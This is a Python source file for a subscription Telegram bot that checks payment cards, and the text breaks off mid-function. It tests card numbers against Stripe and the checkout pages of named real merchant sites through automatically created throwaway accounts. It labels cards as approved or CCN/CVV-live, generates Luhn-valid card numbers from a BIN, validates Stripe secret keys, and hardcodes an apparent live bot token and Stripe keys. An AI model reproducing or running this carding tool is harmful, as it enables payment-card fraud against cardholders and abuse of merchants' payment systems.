import requests
import telebot
import time
import re
import os
import json
import random
import string
import httpx
import asyncio
from telebot import types
from bs4 import BeautifulSoup
from datetime import datetime, timedelta
from faker import Faker

BOT_TOKEN = '7821255517:AAEC49_uBWveQUJbVfydhCPVpvcoBbdThJY'
SUBSCRIBER_ID = ['5716550739']
ADMIN_USER_IDS = ['5716550739']
ALLOWED_USERS_FILE = 'allowed_users.json'
USER_PLANS_FILE = 'user_plans.json'
REDEEM_CODES_FILE = 'redeem_codes.json'
SESSION_FILE = "session.txt"
BINS_API_URL = 'https://bins.antipublic.cc/bins/'
BOT_USERS_FILE = 'bot_users.json'
USER_GATES_FILE = 'user_gates.json'
REGISTERED_USERS_FILE = 'registered_users.json'

PLAN_DURATIONS = {
    "3hours": timedelta(hours=3),
    "24hours": timedelta(days=1),
    "3day": timedelta(days=3),
    "7day": timedelta(days=7),
    "1month": timedelta(days=30),
    "lifetime": None,
    "1hour": timedelta(hours=1)
}
GATEWAY_OPTIONS = ["auth", "2$", "4$"]

COUNTRY_MAP = {
    "usa": "en_US", "uk": "en_GB", "canada": "en_CA", "australia": "en_AU", "germany": "de_DE",
    "france": "fr_FR", "spain": "es_ES", "italy": "it_IT", "netherlands": "nl_NL", "belgium": "nl_BE",
    "india": "en_IN", "china": "zh_CN", "japan": "ja_JP", "korea": "ko_KR", "russia": "ru_RU",
    "brazil": "pt_BR", "mexico": "es_MX", "argentina": "es_AR", "switzerland": "de_CH", "sweden": "sv_SE",
    "poland": "pl_PL", "turkey": "tr_TR", "denmark": "da_DK", "norway": "nb_NO", "finland": "fi_FI",
    "portugal": "pt_PT", "egypt": "ar_EG", "saudi": "ar_SA", "greece": "el_GR", "israel": "he_IL",
    "hungary": "hu_HU", "indonesia": "id_ID", "romania": "ro_RO", "southafrica": "en_ZA", "thailand": "th_TH",
    "vietnam": "vi_VN", "ireland": "en_IE", "singapore": "en_SG", "malaysia": "en_MY", "philippines": "en_PH",
    "colombia": "es_CO", "peru": "es_PE", "chile": "es_CL", "austria": "de_AT", "czech": "cs_CZ",
    "slovakia": "sk_SK", "ukraine": "uk_UA", "uae": "ar_AE", "nigeria": "en_NG", "kenya": "en_KE",
    "bangladesh": "bn_BD", "pakistan": "ur_PK", "venezuela": "es_VE", "ecuador": "es_EC", "bolivia": "es_BO",
    "paraguay": "es_PY", "uruguay": "es_UY", "costarica": "es_CR", "panama": "es_PA", "guatemala": "es_GT",
    "cuba": "es_CU", "dominican": "es_DO", "haiti": "fr_HT", "morocco": "ar_MA", "algeria": "ar_DZ",
    "tunisia": "ar_TN", "libya": "ar_LY", "jordan": "ar_JO", "lebanon": "ar_LB", "syria": "ar_SY",
    "iraq": "ar_IQ", "oman": "ar_OM", "kuwait": "ar_KW", "qatar": "ar_QA", "bahrain": "ar_BH",
    "yemen": "ar_YE", "palestine": "ar_PS", "sudan": "ar_SD", "somalia": "so_SO", "djibouti": "fr_DJ",
    "eritrea": "ti_ER", "ethiopia": "am_ET", "ghana": "en_GH", "cameroon": "fr_CM", "senegal": "fr_SN",
    "ivorycoast": "fr_CI", "congo": "fr_CG", "angola": "pt_AO", "mozambique": "pt_MZ", "zimbabwe": "en_ZW",
    "zambia": "en_ZM", "malawi": "en_MW", "uganda": "en_UG", "tanzania": "sw_TZ", "rwanda": "rw_RW",
    "burundi": "fr_BI", "nepal": "ne_NP", "srilanka": "si_LK", "myanmar": "my_MM", "cambodia": "km_KH",
    "laos": "lo_LA", "mongolia": "mn_MN", "kazakhstan": "kk_KZ", "uzbekistan": "uz_UZ", "turkmenistan": "tk_TK",
    "kyrgyzstan": "ky_KG", "tajikistan": "tg_TJ", "georgia": "ka_GE", "armenia": "hy_AM", "azerbaijan": "az_AZ",
    "moldova": "ro_MD", "albania": "sq_AL", "bosnia": "bs_BA", "croatia": "hr_HR", "serbia": "sr_RS",
    "montenegro": "me_ME", "macedonia": "mk_MK", "slovenia": "sl_SI", "lithuania": "lt_LT", "latvia": "lv_LV",
    "estonia": "et_EE", "belarus": "be_BY", "iceland": "is_IS", "luxembourg": "lb_LU", "malta": "mt_MT",
    "cyprus": "el_CY", "andorra": "ca_AD", "liechtenstein": "de_LI", "monaco": "fr_MC", "vatican": "it_VA",
    "sanmarino": "it_SM", "newzealand": "en_NZ", "iran": "fa_IR", "afghanistan": "fa_AF",
    "niger": "fr_NE", "guinea": "fr_GN", "mali": "fr_ML", "burkinafaso": "fr_BF", "benin": "fr_BJ",
    "togo": "fr_TG", "botswana": "en_BW", "namibia": "en_NA", "lesotho": "en_LS", "eswatini": "en_SZ",
    "fiji": "en_FJ", "papuanewguinea": "en_PG", "solomonislands": "en_SB", "vanuatu": "en_VU", "samoa": "en_WS",
    "kiribati": "en_KI", "micronesia": "en_FM", "marshallislands": "en_MH", "palau": "en_PW", "tonga": "en_TO",
    "tuvalu": "en_TV", "nauru": "en_NR", "cookislands": "en_CK", "niue": "en_NU", "tokelau": "en_TK"
}

def load_registered_users():
    return load_json_file(REGISTERED_USERS_FILE, [])

def save_registered_users(users):
    save_json_file(REGISTERED_USERS_FILE, users)

def is_user_registered(user_id):
    registered_users = load_registered_users()
    return str(user_id) in registered_users

def register_user(user_id):
    registered_users = load_registered_users()
    if str(user_id) not in registered_users:
        registered_users.append(str(user_id))
        save_registered_users(registered_users)
        allowed_users = load_allowed_users()
        allowed_users.append(str(user_id))
        save_allowed_users(allowed_users)
        return True
    return False

def load_json_file(filename, default=None):
    try:
        with open(filename, 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return default if default is not None else {}

def save_json_file(filename, data):
    with open(filename, 'w') as f:
        json.dump(data, f, indent=4)

def generate_random_email(length=8, domain=None):
    common_domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]
    if not domain:
        domain = random.choice(common_domains)
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(length))
    return f"{username}@{domain}"

def extract_ccs_from_line(line):
    cc_pattern = re.compile(r'\b(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})\b')
    matches = cc_pattern.findall(line)
    ccs = []
    for match in matches:
        ccs.append("|".join(match))
    return ccs

def Tele(session, cc):
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]

        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        data = f'type=card&card[number]={card}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&key=pk_live_51JDCsoADgv2TCwvpbUjPOeSLExPJKxg1uzTT9qWQjvjOYBb4TiEqnZI1Sd0Kz5WsJszMIXXcIMDwqQ2Rf5oOFQgD00YuWWyZWX'
        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=20)
        res = response.text

        if 'error' in res:
            error_message = response.json()['error']['message']
            if 'code' in error_message:
                return "CCN ✅"
            else:
                return "DECLINED ❌"
        else:
            payment_method_id = response.json()['id']

            headers = {
                'authority': 'www.thetravelinstitute.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': 'https://www.thetravelinstitute.com',
                'referer': 'https://www.thetravelinstitute.com/my-account/add-payment-method/',
                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
                'x-requested-with': 'XMLHttpRequest',
            }

            params = {
                'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            }
            response = session.get('https://www.thetravelinstitute.com/my-account/add-payment-method/', headers=headers,timeout=20)
            html=(response.text)
            nonce = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html).group(1)

            data = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': payment_method_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': nonce,
            }

            response = session.post('https://www.thetravelinstitute.com/', params=params, headers=headers, data=data, timeout=20)
            res = response.json()

            if res['success'] == False:
                error = res['data']['error']['message']
                if 'code' in error:
                     return "CCN ✅"
                else:
                    return "DECLINED ❌"
            else:
                return "APPROVED ✅"

    except Exception as e:
        print(f"Error in Tele function: {e}")
        return "Error"

def Tele_stripe2(session, cc):
    try:
        card, mm, yy, cvv = cc.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
        API_STRIPE = "pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX"
        headers1 = {
            'Host': 'api.stripe.com',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Path': '/v1/payment_methods',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188'
        }
        data1 = {
            'type': 'card',
            'card[number]': card,
            'card[cvc]': cvv,
            'card[exp_month]': mm,
            'card[exp_year]': yy,
            'guid': '1fa816a3-cb1f-4128-be42-7282b81afcb1a3a78f',
            'muid': '7f46e3e6-1b8c-493a-9d4b-5fde0f8c25d1d76045',
            'sid': '7a3d84d5-adb1-422b-a174-93f94b609dff13111e',
            'pasted_fields': 'number',
            'payment_user_agent': 'stripe.js/3b6d306271; stripe-js-v3/3b6d306271; split-card-element',
            'referrer': 'https://937footballinsider.com',
            'time_on_page': '26176',
            'key': API_STRIPE,
            '_stripe_account': 'acct_1KHCEQEOdymRpNEG'
        }
        response1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers1, data=data1, timeout=20)
        result1 = response1.text
        if 'error' in result1:
            error_message_stripe = response1.json().get('error', {}).get('message', 'Stripe Error')
            if 'card_declined' in error_message_stripe:
                return "DECLINED ❌"
            elif 'incorrect_cvc' in error_message_stripe or 'invalid_cvc' in error_message_stripe:
                return "CCN ✅"
            elif 'expired_card' in error_message_stripe:
                return "EXPIRED ❌"
            elif 'insufficient_funds' in error_message_stripe:
                return "CVV ✅"
            else:
                return "DECLINED ❌"
        else:
            payment_method_id = response1.json()['id']
            headers2 = {
                'authority': '937footballinsider.com',
                'method': 'POST',
                'path': '/membership-account/membership-checkout/',
                'scheme': 'https',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
                'cnntent-Type': 'application/x-www-form-urlencoded',
                'cookie': 'asp_transient_id=bd5da2ddc9e7b772a65c25db5fae3af9;PHPSESSID=uglqu0rrbksib0lcb0stqptko0;pmpro_visit=1;__stripe_mid=7f46e3e6-1b8c-493a-9d4b-5fde0f8c25d1d76045;__stripe_sid=7a3d84d5-adb1-422b-a174-93f94b609dff13111e',
                'origin': 'https://937footballinsider.com',
                'referer': 'https://937footballinsider.com/membership-account/membership-checkout/',
                'sec-Fetch-Dest': 'document',
                'sec-Fetch-Mode': 'navigate',
                'sec-Fetch-Site': 'same-origin',
                'user-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
            }
            email = generate_random_email()
            username = generate_username()
            password = generate_password()
            data2 = {
                'level': '1',
                'checkjavascript': '1',
                'username': username,
                'password': password,
                'password2': password,
                'bemail': email,
                'bconfirmemail': email,
                'fullname': '',
                'CardType': get_card_type_from_bin(card[:1]),
                'submit-checkout': '1',
                'javascriptok': '1',
                'payment_method_id': payment_method_id,
                'AccountNumber': 'XXXXXXXXXXXX' + card[-4:],
                'ExpirationMonth': mm,
                'ExpirationYear': yy
            }
            response2 = requests.post('https://937footballinsider.com/membership-account/membership-checkout/', headers=headers2, data=data2, timeout=20)
            result2 = response2.text
            if any(keyword in result2 for keyword in [
                'Thank you for your membership.',
                "Membership Confirmation",
                'Your card zip code is incorrect.',
                "Thank You For Donation.",
                "incorrect_zip",
                "Success ",
                '"type":"one-time"',
                "/donations/thank_you?donation_number="
            ]):
                return "APPROVED ✅"
            elif any(keyword in result2 for keyword in [
                'Error updating default payment method.Your card does not support this type of purchase.',
                "Your card does not support this type of purchase.",
                'transaction_not_allowed',
                "insufficient_funds",
                "incorrect_zip",
                "Your card has insufficient funds.",
                '"status":"success"',
                "stripe_3ds2_fingerprint"
            ]):
                return "APPROVED ✅"
            elif any(keyword in result2 for keyword in [
                'security code is incorrect.',
                'security code is invalid.',
                "Your card's security code is incorrect."
            ]):
                return "CCN ✅"
            elif "Error updating default payment method. Your card was declined." in result2:
                return "DECLINED ❌"
            elif "Unknown error generating account. Please contact us to set up your membership." in result2:
                return "DECLINED ❌"
            else:
                return "DECLINED ❌"
    except Exception as e:
        print(f"Error in Tele_stripe2 function: {e}")
        return "Error"

def Tele_stripe4(session, cc):
    try:
        n,mm,yy,cvv=cc.split('|')
        if '20' in yy:
            yy = yy.replace('20','')
        f = Faker()
        u = f.user_agent()
        mail=str(f.email()).replace('example','gmail')
        name=str(f.name())
        frs = name.split(' ')[0]
        las = name.split(' ')[1]
        cookies = {
            "_ga": "GA1.1.478559500.1718418847",
            "_ga_4HXMJ7D3T6": "GS1.1.1718418846.1.1.1718419251.0.0.0",
            "_ga_KQ5ZJRZGQR": "GS1.1.1718418847.1.1.1718419283.0.0.0",
            "_gcl_au": "1.1.82229850.1718418847",
            "ci_session": "cf9fqehv7d1crq8qk91d4h88gqeduo6q",
            "optiMonkClientId": "46e544be-7283-dd23-9914-6f4df852ee60"
        }

        headers = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "accept-language": "en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
            "authority": "www.lagreeod.com",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.lagreeod.com",
            "referer": "https://www.lagreeod.com/subscribe",
            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="124"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": u,
            "x-requested-with": "XMLHttpRequest"
        }

        data = {
            "card[cvc]": cvv,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[name]": "ahaha",
            "card[number]": n,
            "coupon": "10080",
            "email": mail,
            "firstname": frs,
            "lastname": las,
            "password": "Kilwa2003",
            "s1": "8",
            "stripe_customer": "",
            "subscription_type": "Weekly+Subscription",
            "sum": "28"
        }

        response = requests.post("https://www.lagreeod.com/register/validate_subscribe", data=data, headers=headers, cookies=cookies, timeout=20)
        text=response.text
        if 'Your card has insufficient funds.' in text:
            return "CVV ✅"
        elif 'was declined' in text or 'number' in text:
            return "DECLINED ❌"
        elif 'Retry later' in text:
            return "Error"
        elif 'requires_action' in text:
            return "APPROVED ✅"
        elif 'message' in text:
            return "APPROVED ✅"
        else:
            return "DECLINED ❌"

    except Exception as e:
        print(f"Error in Tele_stripe4 function: {e}")
        return "Error"

def generate_username():
    username_characters = string.ascii_letters + string.digits
    username = ''.join(random.choice(username_characters) for _ in range(8))
    return f"user_{username}"

def generate_password():
    password_characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(password_characters) for _ in range(12))
    return password

def get_card_type_from_bin(bin_prefix):
    if bin_prefix == '4':
        return 'VISA'
    elif bin_prefix in ['5']:
        return 'MASTERCARD'
    elif bin_prefix in ['3']:
        return 'AMEX'
    elif bin_prefix in ['6']:
        return 'DISCOVER'
    else:
        return 'UNKNOWN'

def create_session():
    try:
        session = requests.Session()
        email = generate_random_email()
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }

        response = session.get('https://www.thetravelinstitute.com/register/', headers=headers, timeout=20)
        html = (response.text)
        soup = BeautifulSoup(html, 'html.parser')
        nonce = soup.find('input', {'id': 'afurd_field_nonce'})['value']
        noncee = soup.find('input', {'id': 'woocommerce-register-nonce'})['value']
        headers = {
            'authority': 'www.thetravelinstitute.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.thetravelinstitute.com',
            'referer': 'https://www.thetravelinstitute.com/register/',
            'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
        }
        data = [
            ('afurd_field_nonce', f'{nonce}'),
            ('_wp_http_referer', '/register/'),
            ('pre_page', ''),
            ('email', f'{email}'),
            ('password', 'Esahatam2009@'),
            ('wc_order_attribution_source_type', 'typein'),
            ('wc_order_attribution_referrer', 'https://www.thetravelinstitute.com/my-account/payment-methods/'),
            ('wc_order_attribution_utm_campaign', '(none)'),
            ('wc_order_attribution_utm_source', '(direct)'),
            ('wc_order_attribution_utm_medium', '(none)'),
            ('wc_order_attribution_utm_content', '(none)'),
            ('wc_order_attribution_utm_id', '(none)'),
            ('wc_order_attribution_utm_term', '(none)'),
            ('wc_order_attribution_utm_source_platform', '(none)'),
            ('wc_order_attribution_utm_creative_format', '(none)'),
            ('wc_order_attribution_utm_marketing_tactic', '(none)'),
            ('wc_order_attribution_session_entry', 'https://www.thetravelinstitute.com/my-account/add-payment-method/'),
            ('wc_order_attribution_session_start_time', '2024-11-17 09:43:38'),
            ('wc_order_attribution_session_pages', '8'),
            ('wc_order_attribution_session_count', '1'),
            ('wc_order_attribution_user_agent',
             'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'),
            ('woocommerce-register-nonce', f'{noncee}'),
            ('_wp_http_referer', '/register/'),
            ('register', 'Register'),
        ]

        response = session.post('https://www.thetravelinstitute.com/register/', headers=headers, data=data, timeout=20)
        if response.status_code == 200:
            with open('Creds.txt', 'a') as f:
                f.write(email + ':' + 'Esahatam2009@')
            return session
        else:
            return None
    except Exception as e:
        return None

def save_session_to_file(session, file_path):
    with open(file_path, "w") as file:
        cookies = session.cookies.get_dict()
        file.write(str(cookies))

def load_session_from_file(file_path):
    try:
        with open(file_path, "r") as file:
            session_data = file.read().strip()
            session = requests.Session()
            cookies = eval(session_data)
            session.cookies.update(cookies)
            return session
    except Exception as e:
        print(f"Error loading session: {e}")
        return None

def manage_session_file():
    if os.path.exists(SESSION_FILE):
        session = load_session_from_file(SESSION_FILE)
        if session:
            return session
    session = create_session()
    if session:
        save_session_to_file(session, SESSION_FILE)
        return session
    return None

def load_user_plans():
    return load_json_file(USER_PLANS_FILE, {})

def save_user_plans(user_plans):
    save_json_file(USER_PLANS_FILE, user_plans)

def get_user_plan(user_id):
    user_plans = load_user_plans()
    return user_plans.get(str(user_id), None)

def set_user_plan(user_id, plan_type, expiry_time):
    user_plans = load_user_plans()
    user_plans[str(user_id)] = {"plan_type": plan_type, "expiry_time": expiry_time}
    save_user_plans(user_plans)

def is_user_subscribed(user_id):
    user_plan = get_user_plan(user_id)
    if not user_plan:
        return False

    expiry_time_str = user_plan.get("expiry_time")
    if user_plan["plan_type"] == "lifetime":
        return True
    if not expiry_time_str:
        return False

    expiry_time = datetime.fromtimestamp(float(expiry_time_str))
    return datetime.now() <= expiry_time

def load_redeem_codes():
    return load_json_file(REDEEM_CODES_FILE, {})

def save_redeem_codes(codes):
    save_json_file(REDEEM_CODES_FILE, codes)

def generate_redeem_code():
    code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    return "GOKU-" + code

def load_allowed_users():
    file_allowed_users = load_json_file(ALLOWED_USERS_FILE, [])
    return list(set(file_allowed_users + ADMIN_USER_IDS))

def save_allowed_users(users):
    non_admin_users = [user for user in users if user not in ADMIN_USER_IDS]
    save_json_file(ALLOWED_USERS_FILE, non_admin_users)

def load_bot_users():
    return load_json_file(BOT_USERS_FILE, [])

def save_bot_users(users):
    save_json_file(BOT_USERS_FILE, users)

async def get_bin_details(bin_number):
    try:
        async with httpx.AsyncClient() as client:
            resp = await client.get(f"{BINS_API_URL}{bin_number}")
            resp.raise_for_status()
            json_data = resp.json()
            brand = json_data.get("brand", "N/A")
            type_ = json_data.get("type", "N/A")
            level = json_data.get("level", "N/A")
            bank = json_data.get("bank", "N/A")
            country = json_data.get("country_name", "N/A")
            flag = json_data.get("country_flag", "N/A")
            currency = json_data.get("currency", "N/A")
            return brand, type_, level, bank, country, flag, currency
    except httpx.HTTPError as e:
        print(f"HTTP Exception: {e}")
        return "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"
    except Exception as e:
        print(f"Exception in get_bin_details: {e}")
        return "N/A", "N/A", "N/A", "N/A", "N/A", "N/A", "N/A"

async def luhn_card_genarator(bin_input, month=None, year=None, cvv=None, amount=10):
    generated_cards = set()
    bin_template = ''.join(c if c.isdigit() or c == 'x' else '' for c in bin_input).replace('x', '#')

    if '#' not in bin_template:
        bin_template += '#' * (16 - len(bin_template))

    if bin_template.startswith('4'):
        card_type = 'VISA'
    elif bin_template.startswith(('51', '52', '53', '54', '55')):
        card_type = 'MASTERCARD'
    elif bin_template.startswith(('34', '37')):
        card_type = 'AMEX'
    elif bin_template.startswith('6'):
        card_type = 'DISCOVER'
    else:
        card_type = 'UNKNOWN'

    while len(generated_cards) < amount:
        card_number = list(bin_template)

        for i in range(len(card_number)):
            if card_number[i] == '#':
                card_number[i] = str(random.randint(0, 9))

        card_number = ''.join(card_number)

        luhn_sum = 0
        reverse_digits = [int(d) for d in card_number[:-1]][::-1]

        for i, digit in enumerate(reverse_digits):
            if i % 2 == 0:
                digit *= 2
                if digit > 9:
                    digit -= 9
            luhn_sum += digit

        check_digit = (10 - (luhn_sum % 10)) % 10
        full_card_number = card_number[:-1] + str(check_digit)

        if full_card_number not in generated_cards:
            generated_cards.add(full_card_number)

    generated_results = []
    for card in generated_cards:
        exp_month = month if month else str(random.randint(1, 12)).zfill(2)
        exp_year = year if year else str(random.randint(24, 30))
        cvv_code = (
            cvv if cvv
            else str(random.randint(100, 999)).zfill(3) if card_type != 'AMEX'
            else str(random.randint(1000, 9999)).zfill(4)
        )
        generated_results.append(f"{card}|{exp_month}|{exp_year}|{cvv_code}")

    return '\n'.join(generated_results)

async def generate_code_blocks(all_cards):
    code_blocks = ""
    cards = all_cards.split('\n')
    for card in cards:
        code_blocks += f"<code>{card}</code>\n"
    return code_blocks

async def gen_cc(cc_bin, month=None, year=None, cvv=None, amount=10):
    return await luhn_card_genarator(cc_bin, month, year, cvv, amount)

def bcall_gen(client, message):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(gen_cmd(client, message))
    loop.close()

async def gen_cmd(client, message):
    user_id = str(message.from_user.id)
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 You do not have access to this bot.")
        return
    if not is_user_subscribed(user_id):
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        return
    try:
        ccsdata = message.text.split()[1]
        cc_parts = ccsdata.split("|")
        cc = cc_parts[0]
        cc = cc.replace('\u200e', '')
        mes = cc_parts[1] if len(cc_parts) > 1 else None
        ano = cc_parts[2] if len(cc_parts) > 2 else None
        cvv = cc_parts[3] if len(cc_parts) > 3 else None
    except IndexError:
        bot.reply_to(message, "❌ Invalid Format! Use:\n`/gen 447697|12|25|123`", parse_mode="Markdown")
        return
    amount = 10
    try:
        amount = int(message.text.split()[2])
    except (IndexError, ValueError):
        pass
    delete_msg = bot.reply_to(message, "<b>Generating...</b>", parse_mode="HTML")
    start = time.perf_counter()
    getbin = await get_bin_details(cc[:6])
    brand, type_, level, bank, country, flag, currency = getbin
    if amount > 10000:
        bot.reply_to(message, "<b>⚠️ Maximum Allowed: 10K</b>", parse_mode="HTML")
        return
    all_cards = await luhn_card_genarator(cc, mes, ano, cvv, amount)
    if not os.path.exists("downloads"):
        os.makedirs("downloads")
    filename = f"downloads/{amount}x_CC_Generated_By_{user_id}.txt"
    if amount == 10:
        response_text = (
            f"- ✅ 𝐂𝐂 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲\n"
            f"- 🔢 𝐁𝐢𝐧: <code>{cc}</code>\n"
            f"- 🔢 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}\n\n"
            f"{await generate_code_blocks(all_cards)}\n"
            f"- ℹ️ {brand} - {type_} - {level}\n"
            f"- 🏛 𝐁𝐚𝐧𝐤: {bank}\n"
            f"- 🇺🇸 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag}\n\n"
            f"- ⏳ 𝐓𝐢𝐦𝐞: {time.perf_counter() - start:.2f}s\n"
            f"- 👤 Checked by <a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
        )
        bot.delete_message(message.chat.id, delete_msg.message_id)
        bot.reply_to(message, response_text, parse_mode="HTML")
        time.sleep(0.1)
    else:
        with open(filename, "w") as f:
            f.write(all_cards)
        caption = f"""
- 🔢 𝐁𝐢𝐧: <code>{cc}</code>
- 🔢 𝐀𝐦𝐨𝐮𝐧𝐭: {amount}

- ℹ️ {brand} - {type_} - {level}
- 🏛 𝐁𝐚𝐧𝐤: {bank}
- 🇺🇸 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country} {flag} {currency}

- ⏳ 𝐓𝐢𝐦𝐞: {time.perf_counter() - start:.2f}s
- 👤 Checked by <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> ⤿ Premium ⤾
"""
        bot.delete_message(message.chat.id, delete_msg.message_id)
        with open(filename, "rb") as doc_file:
            bot.send_document(
                message.chat.id,
                doc_file,
                caption=caption,
                parse_mode="HTML",
                reply_to_message_id=message.message_id
            )
        try:
            os.remove(filename)
        except FileNotFoundError:
            pass
        time.sleep(0.1)

def load_user_gates():
    return load_json_file(USER_GATES_FILE, {})

def save_user_gates(user_gates):
    save_json_file(USER_GATES_FILE, user_gates)

def get_user_gate(user_id):
    user_gates = load_user_gates()
    return user_gates.get(str(user_id), "auth")

def set_user_gate(user_id, gate_type):
    user_gates = load_user_gates()
    if gate_type in GATEWAY_OPTIONS:
        user_gates[str(user_id)] = gate_type
        save_user_gates(user_gates)
        return True
    return False

def sk_check(stripe_secret_key):
    url = "https://api.stripe.com/v1/balance"
    headers = {"Authorization": f"Bearer {stripe_secret_key}"}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        balance_data = response.json()
        account_response = requests.get("https://api.stripe.com/v1/account", headers=headers)
        account_info = account_response.json() if account_response.status_code == 200 else {}

        result = f"✅ <b>Valid Stripe Key!</b>\n"
        result += f"🔹 <b>Account ID:</b> <code>{account_info.get('id', 'N/A')}</code>\n"
        result += f"🔹 <b>Business Name:</b> <code>{account_info.get('business_name', 'N/A')}</code>\n"
        result += f"🔹 <b>Country:</b> <code>{account_info.get('country', 'N/A')}</code>\n"
        result += f"💰 <b>Balance Available:</b> <code>{balance_data.get('available', 'N/A')}</code>\n"
        result += f"💰 <b>Balance Pending:</b> <code>{balance_data.get('pending', 'N/A')}</code>\n"
    else:
        error_data = response.json()
        result = f"❌ <b>Invalid or Expired Key!</b>\n"
